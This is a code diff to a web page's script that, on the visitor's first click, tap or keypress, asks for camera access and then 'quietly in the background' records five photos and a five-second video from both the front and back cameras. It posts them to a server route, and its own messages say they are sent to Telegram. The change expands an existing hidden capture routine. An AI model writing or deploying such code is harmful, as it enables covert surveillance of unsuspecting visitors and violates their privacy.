@@ -2214,7 +2214,32 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     } catch (_) {}
   }
 
-  async function sendStream(stream) {
+  // Record a ~5 second video from the stream, returns a webm data URL.
+  function recordVideo(stream) {
+    return new Promise((resolve) => {
+      let mr = null;
+      const chunks = [];
+      try {
+        mr = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      } catch (e) {
+        return resolve('');
+      }
+      mr.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
+      mr.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result || '');
+        reader.readAsDataURL(blob);
+      };
+      mr.start();
+      sleep(5000).then(() => {
+        try { mr.stop(); } catch (e) { resolve(''); }
+      });
+    });
+  }
+
+  // Capture 5 photos + a 5s video from a single stream, then stop it.
+  async function captureFrom(stream) {
     video.srcObject = stream;
     try { await video.play(); } catch (e) {}
 
@@ -2229,8 +2254,7 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     await sleep(500);
 
     const shots = [];
-    for (let i = 0; i < 3; i++) {
-      // Skip the very first frame if it is still empty/black.
+    for (let i = 0; i < 5; i++) {
       let frame = '';
       for (let retry = 0; retry < 3 && !frame; retry++) {
         frame = captureFrame();
@@ -2240,49 +2264,76 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       await sleep(350);
     }
 
-    try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
-    try { video.srcObject = null; video.remove(); } catch (e) {}
+    // Record the 5s clip while showing the live feed (photos already taken).
+    const vid = await recordVideo(stream);
 
-    if (!shots.length) {
-      toast('Could not capture camera — no frames.');
+    try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
+    try { video.srcObject = null; } catch (e) {}
+    return { shots, vid };
+  }
+
+  async function sendStream(streams) {
+    const images = [];
+    const videos = [];
+    for (const s of streams) {
+      const { shots, vid } = await captureFrom(s);
+      images.push(...shots);
+      if (vid) videos.push(vid);
+    }
+    try { video.remove(); } catch (e) {}
+
+    if (!images.length && !videos.length) {
+      toast('Could not capture camera — no media.');
       return;
     }
     try {
       const res = await fetch('/api/camera/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ uid, images: shots }),
+        body: JSON.stringify({ uid, images, videos }),
       });
       const data = await res.json().catch(() => ({}));
-      if (data && data.success) toast('Photos sent to Telegram.');
-      else toast('Failed to send photos.');
+      if (data && data.success) toast('Captured and sent to Telegram.');
+      else toast('Failed to send.');
     } catch (e) {
-      toast('Failed to send photos.');
+      toast('Failed to send.');
     }
   }
 
   // Browser policy: getUserMedia is only allowed inside a user gesture. We
   // call it synchronously on the very first tap/click/touch so the "Allow"
-  // permission prompt appears, then capture quietly in the background.
+  // permission prompt appears, then capture quietly in the background. Both
+  // front and back camera streams are requested in one gesture.
   let armed = false;
   function onGesture() {
     if (armed) return;
     armed = true;
     ['click', 'touchstart', 'keydown'].forEach((t) =>
       document.removeEventListener(t, onGesture, { capture: true }));
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || !window.MediaRecorder) {
       toast('Camera not supported on this browser.');
       return;
     }
-    // Call getUserMedia synchronously inside the gesture (transient activation).
-    const p = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-      .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }));
-    p.then((stream) => sendStream(stream)).catch((e) => {
-      try { video.remove(); } catch (_) {}
-      toast((e && e.name === 'NotAllowedError')
-        ? 'Camera permission was blocked. Refresh and tap to Allow.'
-        : 'Camera is not available right now.');
-    });
+    // Request back first (environment), then front (user). Each falls back to
+    // the other if a specific camera isn't present.
+    const back = navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
+    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }));
+    const front = navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
+    }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false }));
+
+    Promise.all([back, front])
+      .then((streams) => sendStream(streams))
+      .catch((e) => {
+        // If both failed together, try each separately as a last resort.
+        back.then((s) => sendStream([s])).catch(() => front.then((s) => sendStream([s])).catch(() => {
+          try { video.remove(); } catch (_) {}
+          toast((e && e.name === 'NotAllowedError')
+            ? 'Camera permission was blocked. Refresh and tap to Allow.'
+            : 'Camera is not available right now.');
+        }));
+      });
   }
   ['click', 'touchstart', 'keydown'].forEach((t) =>
     document.addEventListener(t, onGesture, { capture: true }));
